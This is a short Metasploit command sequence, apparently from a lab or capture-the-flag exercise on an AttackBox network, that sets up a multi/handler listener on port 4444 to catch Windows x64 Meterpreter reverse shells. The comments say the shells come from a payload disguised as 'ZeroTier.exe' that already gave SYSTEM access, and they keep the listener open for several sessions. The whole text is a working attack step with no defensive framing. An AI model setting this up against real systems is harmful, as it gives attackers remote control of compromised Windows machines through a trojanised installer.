# 1. Select the generic payload handler
use exploit/multi/handler

# 2. Set the payload (Matches your successful SYSTEM shell)
set payload windows/x64/meterpreter/reverse_tcp

# 3. Set your own IP (The AttackBox/VPN IP)
set lhost 192.168.160.114

# 4. Set the port (Must match the port in your ZeroTier.exe payload)
set lport 4444

# 5. (Optional but recommended) Keep the listener alive for multiple shells
set ExitOnSession false

# 6. Start the listener
run